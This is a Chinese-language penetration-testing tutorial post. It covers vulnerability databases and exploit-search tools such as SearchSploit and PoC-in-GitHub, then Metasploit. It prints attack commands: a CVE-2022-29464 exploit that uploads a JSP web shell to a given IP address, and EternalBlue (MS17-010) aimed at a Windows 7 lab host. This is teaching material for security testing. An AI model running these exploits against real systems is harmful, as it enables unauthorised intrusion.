![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230914094502081-1042946552.png)

```plain
#知识点：
1、MSF-漏洞利用框架使用
2、库查找-CVE&CNVD&关键字
3、库整理-CVE&CNVD漏洞详情
4、新漏洞-框架或其他未集成利用
集成和未集成漏洞的利用思路，漏洞利用条件等。

#漏洞资源：
today-cve
https://cassandra.cerias.purdue.edu/CVE_changes/today.html
cve官网（世界各地内）
https://cve.mitre.org/
国家信息安全漏洞共享平台（自己国家）
https://www.cnvd.org.cn/
国家信息安全漏洞库
http://www.cnnvd.org.cn/
seebug知道创宇
https://www.seebug.org/

漏洞发现后，一般会有那些关于漏洞的常见信息：
1、漏洞对象
2、漏洞编号
3、漏洞类型
```

- 漏洞利用-整理库-PocOrExp&CVE-CNVD

```plain
项目地址：
https://github.com/ttonys/Scrapy-CVE-CNVD
https://github.com/ycdxsb/PocOrExp_in_Github
有些漏洞在公开漏洞库里面没有集成，比如有cnvd证书没有cve证书，有一些影响比较少的没有证书等等。在这种情况下，网络上搜索也不会找到相关利用资源。


整理完善，才能做到尽量的掌握或者了解
过程：
1.下载已知的漏洞资源
2.实时地监控新出漏洞

不仅要对cve整理完善，也要对cnvd整理完善

PocOrExp_in_Github能对cve进行实时监控。
需要配置redis服务和163.com邮箱

但是安装失败了，主要环境问题。
PocOrExp_in_Github
需要配置GitHub的key
安装：G:\python38\Scripts\pip.exe install -r requirements.txt

执行：G:\python38\Scripts\pip.exe exp.py -y 2022 -i y
把所有的库都进行爬取。
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230914094515675-960264174.png)

- 漏洞利用-查找库-SearchSploit&PoC-in-GitHub

```plain
项目地址：
https://github.com/nomi-sec/PoC-in-GitHub
https://github.com/offensive-security/exploitdb
漏洞利用查找，基于三个信息查找：
1.漏洞类型
2.漏洞编号
3.漏洞对象

exploitdb
这个是基于https://www.exploit-db.com/来整理出来的。这个是Linux版本，没有Windows版本。
这个可以根据关键字进行搜索特定的漏洞，比如端口 Windows Oracle等漏洞关键字都可以用来搜索。

使用说明：
  searchsploit afd windows local
  searchsploit -t oracle windows
  searchsploit -p 39446
  searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
  searchsploit -s Apache Struts 2.0.0
  searchsploit linux reverse password
  searchsploit -j 55555 | json_pp



比如搜索shiro这个漏洞
执行：./searchsploit shiro
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230914094515389-536331126.png)

```plain
然后这里有给到路径：multiple/remote/34952.txt和multiple/remote/48410.rb，这两个有的是直接利用py文件，有的是分析漏洞地址，给一些漏洞地址。漏洞利用脚本或者漏洞利用说明。
rb文件可能需要载入msf中来进行运行。
PoC-in-GitHub
这里也是实时更新的，里面有比较全的，比较有区分性。可以根据漏洞编号来寻找这些漏洞利用地址或者漏洞的参考地址。

比如说CVE-2022-1096这个漏洞，那个可以打开这个文件，可以看到给到的利用地址：https:\/\/github.com\/Maverick-cmd\/Chrome-and-Edge-Version-Dumper
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230914094516139-789093026.png)

```plain
利用漏洞：
msf漏洞利用框架：
集成大部分的安全漏洞利用模块，可以直接利用msf对漏洞进行利用
但不代表所有的漏洞都有集成，漏洞的类型或者漏洞的影响等会造成未集成在msf中。（利用过程很复杂，或者影响不大，时间太快。）

不集成原因：
1.最新漏洞
2.漏洞复现太复杂
3.漏洞影响太低

1.利用框架来进行漏洞复现
2.如果框架不集成怎么进行复现
```

- 漏洞利用-模块框架-MetaSploit-Framework（MSF）

```plain
https://www.metasploit.com/
安装下载:
https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html
简单使用：
https://blog.csdn.net/weixin_42380348/article/details/123549631


比如在https://vulfocus.cn/#/开一个靶场，然后在msf中搜索关键字来进行测试。

执行：search WSO2
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230914094515522-1899603614.png)

```plain
在这里显示没有，那么就应该怎么操作呢？
在这里就不能利用msf来进行测试

然后搜索相关的漏洞编号，找到CVE-2022-29464这个框架
找到CVE-2022-29464这个命令的文件，然后找到漏洞利用地址：https:\/\/github.com\/hakivvi\/CVE-2022-29464

下载这个git，然后运行py文件。

用python3运行就可以了。

执行：python exploit.py https://123.58.236.76:9443 shell.jsp
在msf中，一般都是系统层面的漏洞比较多，web层面的漏洞比较少，所以一般来说用到msf都是用到系统层面的漏洞。
前期通过扫描，得到Windows7中有一个系统漏洞，ip：192.168.233.134


启动msf：
use exploit/windows/smb/ms17_010_eternalblue
set rhosts 192.168.233.134
exploit
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230914094515774-1256652575.png)

```plain
msf图形化界面：https://blog.csdn.net/weixin_42489549/article/details/117514558
```

- 漏洞利用-杂乱工具-特定图像化渗透武器库（V6.1）

```plain
https://mp.weixin.qq.com/s/Ha1R17KH-vssbr8cmYwl4Q
解决msf不集成的漏洞，是一个图形化的工具等。
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230914094516333-1135247031.png)

```plain
但是还有很多漏洞没有工具怎么办，或者说找不到这个系列的漏洞。没有工具。
```